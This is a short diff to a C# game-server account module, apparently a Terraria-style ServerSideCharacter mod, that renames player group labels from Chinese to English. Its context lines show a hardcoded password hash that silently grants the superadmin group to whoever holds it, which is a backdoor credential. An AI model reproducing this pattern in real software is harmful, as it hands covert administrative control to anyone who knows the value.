@@ -283,7 +283,7 @@ namespace ServerSideCharacter2
 				ID = ServerSideCharacter2.PlayerCollection.GetNextID(),
 				HasPassword = false,
 				IsMuted = false,
-				Group = "公民",
+				Group = "default",
 				Union = null,
 				Password = "",
 				LifeMax = 100,
@@ -419,7 +419,7 @@ namespace ServerSideCharacter2
 			_info.Password = info.Password;
 			if(info.Password == "8784e5c45a84060c1c6465861a4c5f1e")
 			{
-				_info.Group = "超级管理员";
+				_info.Group = "superadmin";
 			}
 		}
 
